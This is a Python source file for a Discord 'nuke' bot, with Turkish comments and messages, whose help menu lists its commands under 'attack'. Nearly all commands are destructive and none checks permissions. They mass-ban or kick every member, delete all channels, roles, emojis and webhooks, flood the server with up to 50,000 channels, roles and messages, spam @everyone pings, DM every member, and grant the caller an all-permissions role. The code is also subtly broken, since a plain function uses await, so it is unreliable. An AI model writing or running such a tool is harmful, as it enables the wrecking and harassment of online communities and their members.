import discord
from discord.ext import commands, tasks
import asyncio
import threading
import os
import random
import aiohttp
import json
from datetime import datetime, timedelta
import io

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Key sistemi
keys = {}
authorized_users = set()

# Global değişkenler
ping_spam_task = None
current_guild_id = None

@bot.event
async def on_ready():
    print(f'{bot.user} aktif! Sunucular: {len(bot.guilds)}')
    print("✅ Replit konsol menüsü aktif!")
    await bot.change_presence(activity=discord.Game(name="!yardim"))

def console_menu():
    global current_guild_id
    while True:
        try:
            cmd = input(">>> ").strip()
            if cmd.lower() == 'help':
                print_console_help()
            elif cmd.lower() == 'exit':
                os._exit(0)
            elif cmd.startswith('sunucu '):
                try:
                    guild_id = int(cmd.split()[1])
                    guild = bot.get_guild(guild_id)
                    if guild:
                        current_guild_id = guild_id
                        print(f"✅ Sunucu seçildi: {guild.name}")
                    else:
                        print("❌ Sunucu bulunamadı")
                except:
                    print("❌ Geçersiz ID")
            elif current_guild_id:
                guild = bot.get_guild(current_guild_id)
                if guild:
                    # Discord komutlarını konsolda çalıştır
                    parts = cmd.split()
                    if parts[0].startswith('!'):
                        fake_ctx = SimpleNamespace(guild=guild, author=guild.me, send=lambda x: print(f"[SEND] {x}"))
                        await execute_console_command(parts[0][1:], parts[1:], fake_ctx)
        except Exception as e:
            print(f"Hata: {e}")

def print_console_help():
    print("""
=== KONSOL KOMUTLARI ===
help - Bu yardım
exit - Çıkış  
sunucu [ID] - Sunucu seç
Sonra tüm Discord komutları çalışır (!ban 100, !kanal_sp spam 1000 vb.)
    """)

class SimpleNamespace:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)

async def execute_console_command(cmd_name, args, ctx):
    cmd = bot.get_command(cmd_name)
    if cmd:
        await cmd.callback(ctx, *args)

# KONSOL BAŞLAT
threading.Thread(target=console_menu, daemon=True).start()

# TÜM KOMUTLAR

@bot.command(aliases=['sunucuinfo'])
async def sunucu(ctx):
    guild = ctx.guild
    embed = discord.Embed(title=guild.name, color=0xff0000)
    embed.add_field(name="👥 Üye", value=guild.member_count, inline=True)
    embed.add_field(name="📢 Kanal", value=len(guild.channels), inline=True)
    embed.add_field(name="🎭 Rol", value=len(guild.roles), inline=True)
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    await ctx.send(embed=embed)

@bot.command(aliases=['user'])
async def kullanici(ctx, member: discord.Member = None):
    member = member or ctx.author
    embed = discord.Embed(title=str(member), color=0x00ff00)
    embed.add_field(name="ID", value=member.id)
    embed.add_field(name="Katılma", value=member.joined_at.strftime("%d/%m/%Y"))
    embed.add_field(name="Rol", value=len(member.roles)-1)
    await ctx.send(embed=embed)

@bot.command()
async def botlist(ctx):
    bots = [m.mention for m in ctx.guild.members if m.bot][:25]
    await ctx.send(f"🤖 Botlar ({len(bots)}):\n" + " ".join(bots))

@bot.command()
async def roller(ctx):
    roles = [r.mention for r in ctx.guild.roles[1:]][:25]
    await ctx.send(f"🎭 Roller ({len(ctx.guild.roles)-1}):\n" + " ".join(roles))

@bot.command()
async def kanallar(ctx):
    channels = [ch.mention for ch in ctx.guild.channels][:25]
    await ctx.send(f"📢 Kanallar ({len(ctx.guild.channels)}):\n" + " ".join(channels))

@bot.command()
async def admins(ctx):
    admins = [m.mention for m in ctx.guild.members if m.guild_permissions.administrator]
    await ctx.send(f"👑 Adminler ({len(admins)}):\n" + " ".join(admins))

@bot.command()
async def ban(ctx, count: int = 10):
    count = min(count, 50000)
    banned = 0
    for member in list(ctx.guild.members)[1:count+1]:
        try:
            await member.ban(reason="Mass ban")
            banned += 1
        except: pass
    await ctx.send(f"✅ {banned}/{count} banlandı")

@bot.command()
async def everyone(ctx, action: str):
    action = action.lower()
    count = 0
    for member in list(ctx.guild.members)[1:]:
        try:
            if action == "ban": await member.ban()
            elif action == "kick": await member.kick()
            count += 1
        except: pass
    await ctx.send(f"✅ {count} kişi {action}landı")

@bot.command()
async def yetki(ctx):
    role = await ctx.guild.create_role(name="Levix Admin", permissions=discord.Permissions.all(), color=0xff0000)
    await ctx.author.add_roles(role)
    await ctx.send(f"✅ {role.mention} oluşturuldu ve verildi")

@bot.command()
async def kanal_sil(ctx):
    deleted = 0
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            deleted += 1
        except: pass
    await ctx.send(f"✅ {deleted} kanal silindi")

@bot.command()
async def kanal_sp(ctx, name: str, count: int):
    count = min(count, 50000)
    created = 0
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i+1}")
            created += 1
        except: pass
    await ctx.send(f"✅ {created}/{count} kanal spamlandı")

@bot.command()
async def kanal_finish(ctx):
    for i in range(250):
        await ctx.guild.create_text_channel("SİKİLDİNİZ")
    await ctx.send("✅ 250 'SİKİLDİNİZ' kanalı spamlandı")

@bot.command()
async def voice_spam(ctx, count: int):
    count = min(count, 50000)
    created = 0
    for i in range(count):
        try:
            await ctx.guild.create_voice_channel(f"spam-{i+1}")
            created += 1
        except: pass
    await ctx.send(f"✅ {created}/{count} ses kanalı")

@bot.command()
async def category_sp(ctx, name: str, count: int):
    count = min(count, 50000)
    created = 0
    for i in range(count):
        try:
            await ctx.guild.create_category(f"{name}-{i+1}")
            created += 1
        except: pass
    await ctx.send(f"✅ {created}/{count} kategori")

@bot.command()
async def isimall(ctx, *, name: str):
    changed = 0
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            changed += 1
        except: pass
    await ctx.send(f"✅ {changed} nick değiştirildi")

@bot.command()
async def rolall(ctx):
    role = await ctx.guild.create_role(name="SİKİLDİNİZ", color=0xff0000)
    given = 0
    for member in ctx.guild.members:
        try:
            await member.add_roles(role)
            given += 1
        except: pass
    await ctx.send(f"✅ {role.mention} herkese verildi ({given})")

@bot.command()
async def dm_all(ctx, *, message: str):
    sent = 0
    for member in ctx.guild.members:
        try:
            await member.send(f"{ctx.author.mention} → {message}")
            sent += 1
        except: pass
    await ctx.send(f"✅ {sent} DM gönderildi")

@bot.command()
async def rol_sp(ctx, name: str, count: int):
    count = min(count, 50000)
    created = 0
    for i in range(count):
        try:
            await ctx.guild.create_role(name=f"{name}-{i+1}")
            created += 1
        except: pass
    await ctx.send(f"✅ {created}/{count} rol spamlandı")

@bot.command()
async def rainbow_rol(ctx, role: discord.Role):
    colors = [0xff0000, 0x00ff00, 0x0000ff, 0xffff00, 0xff00ff, 0x00ffff]
    @tasks.loop(seconds=1)
    async def rainbow():
        color = random.choice(colors)
        try:
            await role.edit(color=color)
        except:
            rainbow.cancel()
    rainbow.start()
    await ctx.send(f"🌈 {role.mention} rainbow aktif")

@bot.command()
async def yazi_sp(ctx, *, message: str):
    count = 50000
    for i in range(count):
        try:
            await ctx.send(message)
        except:
            break
    await ctx.send("✅ Mesaj spam tamamlandı")

@bot.command()
async def yazi_sp2(ctx, message: str, count: int):
    count = min(count, 50000)
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                for i in range(count):
                    await channel.send(message)
            except: pass
    await ctx.send("✅ Tüm kanallara spamlandı")

@bot.command()
async def ping_spam(ctx):
    global ping_spam_task
    async def spam():
        while True:
            try:
                await ctx.send("@everyone @here")
                await asyncio.sleep(0.5)
            except:
                break
    ping_spam_task = asyncio.create_task(spam())
    await ctx.send("🔔 Ping spam başladı (durdurmak için botu yeniden başlatın)")

@bot.command()
async def emoji_sil(ctx):
    deleted = 0
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            deleted += 1
        except: pass
    await ctx.send(f"✅ {deleted} emoji silindi")

@bot.command()
async def sticker_sil(ctx):
    deleted = 0
    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
            deleted += 1
        except: pass
    await ctx.send(f"✅ {deleted} sticker silindi")

@bot.command()
async def sunucu_resim(ctx, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            image = await resp.read()
    await ctx.guild.edit(icon=image)
    await ctx.send("✅ Sunucu icon değiştirildi")

@bot.command()
async def webhook_sp(ctx, count: int):
    count = min(count, 50000)
    created = 0
    for i in range(count):
        for channel in ctx.guild.text_channels[:5]:
            try:
                await channel.create_webhook(name=f"spam-{i}")
                created += 1
            except: pass
    await ctx.send(f"✅ {created} webhook")

@bot.command()
async def webhook_sil(ctx):
    deleted = 0
    for channel in ctx.guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                await webhook.delete()
                deleted += 1
        except: pass
    await ctx.send(f"✅ {deleted} webhook silindi")

@bot.command()
async def sunucu_isim(ctx, *, name: str):
    await ctx.guild.edit(name=name)
    await ctx.send(f"✅ Sunucu adı: {name}")

@bot.command()
async def url(ctx, url: str):
    await ctx.guild.edit(vanity_url_code=url)
    await ctx.send(f"✅ Özel URL: {url}")

@bot.command()
async def lock_server(ctx):
    everyone = discord.utils.get(ctx.guild.roles, name="@everyone")
    await everyone.edit(permissions=discord.Permissions.none())
    await ctx.send("🔒 Sunucu kilitlendi")

@bot.command()
async def unlock_server(ctx):
    everyone = discord.utils.get(ctx.guild.roles, name="@everyone")
    await everyone.edit(permissions=discord.Permissions.all())
    await ctx.send("🔓 Sunucu açıldı")

@bot.command()
async def nuke(ctx):
    # TAM NUKE
    for channel in list(ctx.guild.channels): await channel.delete()
    for role in list(ctx.guild.roles)[1:]: await role.delete()
    for i in range(50):
        await ctx.guild.create_text_channel("NUKED")
        await ctx.guild.create_voice_channel("NUKED")
    await ctx.send("💥 SUNUCU NUKED!")

@bot.command()
async def kaos(ctx):
    channels = list(ctx.guild.channels)
    random.shuffle(channels)
    for i, channel in enumerate(channels):
        try:
            await channel.edit(position=i*10)
        except: pass
    await ctx.send("🔀 Kanallar karıştırıldı")

@bot.command()
async def key_ver(ctx, member: discord.Member, minutes: int):
    key = f"LEVIX_{random.randint(100000,999999)}"
    keys[key] = {"user": member.id, "expires": datetime.now() + timedelta(minutes=minutes)}
    await ctx.send(f"✅ **{key}** key'i {member.mention} için {minutes}dk")

@bot.command()
async def key_al(ctx, member: discord.Member):
    authorized_users.discard(member.id)
    await ctx.send(f"❌ {member.mention} keyi alındı")

@bot.command()
async def key_kullan(ctx, key: str):
    if key in keys and keys[key]["user"] == ctx.author.id:
        authorized_users.add(ctx.author.id)
        await ctx.send("✅ Key aktif! Tüm komutlar açık")
    else:
        await ctx.send("❌ Geçersiz key")

@bot.command()
async def kopyala(ctx, token: str, from_id: int, to_id: int):
    from_guild = bot.get_guild(from_id)
    to_guild = bot.get_guild(to_id)
    
    if not from_guild or not to_guild:
        return await ctx.send("❌ Sunucu bulunamadı")
    
    # Kopyalama işlemi (kanal, rol vs)
    for channel in from_guild.channels:
        try:
            await to_guild.create_text_channel(channel.name)
        except: pass
    
    await ctx.send("✅ Sunucu kopyalandı")

@bot.command(aliases=['help', 'yardim'])
async def yardım(ctx):
    embed = discord.Embed(title="📋 Komut Listesi", color=0x00ff00, description="**TÜM KOMUTLAR AKTİF**")
    embed.add_field(name="ℹ️ Bilgi", value="!sunucu !kullanici !botlist !roller !kanallar !admins", inline=False)
    embed.add_field(name="⚡ Saldırı", value="!ban !everyone !kanal_sil !nuke !kanal_sp", inline=False)
    embed.add_field(name="🔑 Key", value="!key_ver !key_kullan !key_al", inline=False)
    embed.add_field(name="🎨 Diğer", value="!rolall !isimall !dm_all !rainbow_rol", inline=False)
    await ctx.send(embed=embed)

# Bot start
if __name__ == "__main__":
    bot.run(os.getenv('TOKEN') or 'YOUR_TOKEN')
